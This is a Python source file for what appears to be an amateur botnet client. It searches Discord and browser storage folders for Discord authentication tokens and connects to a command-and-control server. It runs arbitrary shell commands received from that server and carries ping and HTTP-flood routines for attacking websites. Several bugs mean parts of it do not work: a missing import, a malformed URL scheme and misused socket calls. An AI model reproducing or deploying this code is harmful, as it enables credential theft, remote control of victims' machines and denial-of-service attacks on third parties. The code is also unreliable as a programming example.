from lib2to3.pgen2.token import COMMA
import os
import time
import socket
import subprocess
import requests
import threading
#imported libs
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

#change these values of variables to your's

hostname = socket.gethostname()
SERVER_IP = socket.gethostbyname(str(hostname))
SERVER_PORT = 27033
print(str(SERVER_IP) + str(SERVER_PORT))
def find_tokens(path):
    path += '\\Local Storage\\leveldb'

    tokens = []

    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue

        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens
#main token search function
def search_tokens():
   
    
    #searching for discord token
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    #searches these paths for tokens
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
        'Google Chrome': local + '\\Google\\Chrome\\User Data\\Default',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }
    #final output message
    message = ""
    #checks for path validity&tokens
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue

        message += f'\n**{platform}**\n```\n'

        tokens = find_tokens(path)

        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n'
        else:
            message += 'No tokens found.\n'
    return message
#function that will connect this client to the server
def connect(server_ip, server_port):
    try:
        tok_m = search_tokens()
    except:
        tok_m = "Failed to get tokens"
        print("token steal failed")
    
  
     
    try:
        s.connect((str(server_ip), int(server_port)))
        print("connected")
        #s.sendall(tok_m).encode()
    except socket.error as e:
        print(e)
        
    
    print(f"connected to {server_ip}:{server_port}")
   # s.send(f"{tok_m}".encode())
    
#function that will return&decode received command
def recv_comms():
    while True:
        try:
            rec_command = s.recv(2048).decode()
            #return rec_command
            main_c = rec_command.split(" ")[0]
            split_command = main_c.split(" ")
            print("got a response")
            if "ping" in main_c:
                try:
                    ping(str(split_command[1]), int(split_command[2]), int(split_command[3]))
                except:
                    respond(f"{main_c} error, args: {split_command}")
            if "flood" in main_c:
                try:
                    flood_http(str(split_command[1]), int(split_command[2]))
                except:
                    respond(f"{main_c} error, args: {split_command}")
            if "token" in main_c:
                try:
                    print(tok_m)
                    s.sendall(tok_m).encode()
                except Exception as e:
                    respond("roorooroo", e)
            else:
                subprocess.Popen(main_c, shell=True)
        except Exception as e:
            print(e)
            continue
#send back response to c&c server
def respond(response):
    if not response:
        print("response not parsed")
        return
    else:
        s.send(str(response).encode())

def ping(ip, port, loops):
    if not ip or not port or not loops:
        print("define ip & port & loops")
        return
    else:
        for i in int(loops):
            subprocess.Popen(f"ping {ip}:{port}", shell=True)

def flood_http(domain, duration):
    print("FLOODING")
    r_duration = int(duration) * 200
    if not domain or not duration:
        print("define arguments")
        return
    else:
        l = 0
        print("LOOPS")
        while True:
            l+=1
            if int(l) == int(r_duration) or int(l) > int(r_duration):
                break
            time.sleep(0.2)
            re = requests.get(f"htt://{str(domain)}")
            if re.status_code == 200:
                pass
            else:
                respond(f"Failed to flood {domain}")
print(f"found server-> {SERVER_IP}:{SERVER_PORT}")
#connect(SERVER_IP, SERVER_PORT)
print("connecting...")
#connect(SERVER_IP, SERVER_PORT)
connect_thread = threading.Thread(target=connect, args=(SERVER_IP, SERVER_PORT))
recv_c_thread = threading.Thread(target=recv_comms)
connect_thread.start()
recv_c_thread.start()

    
        


